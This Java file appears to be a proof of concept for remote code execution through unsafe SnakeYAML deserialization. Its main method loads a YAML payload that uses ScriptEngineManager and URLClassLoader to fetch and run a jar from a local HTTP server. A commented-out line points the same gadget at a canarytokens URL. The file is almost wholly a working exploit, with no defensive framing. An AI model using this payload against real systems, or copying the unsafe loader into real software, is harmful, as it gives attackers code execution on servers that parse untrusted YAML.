package com.mycompany.app;

import java.io.InputStream;
import java.util.Map;

import org.yaml.snakeyaml.Yaml;

/**
 * PoC or GTFO!
 */
public class App
{

    private final String message = "PoC!";

    public App() {}

    public static void main(String[] args) {
        System.out.println(new App().getMessage());
        
        
        Yaml yaml = new Yaml();
        //String context = "1: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://x3zwc5frdprkq24wz9iqxllns.canarytokens.com\"]]]]\n";
        String payload = "1337: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8080/p1.jar\"]]]]\n";
        
        yaml.loadAs(payload, Map.class);
        System.out.println(payload);        
    }

    private final String getMessage() {
        return message;
    }

}
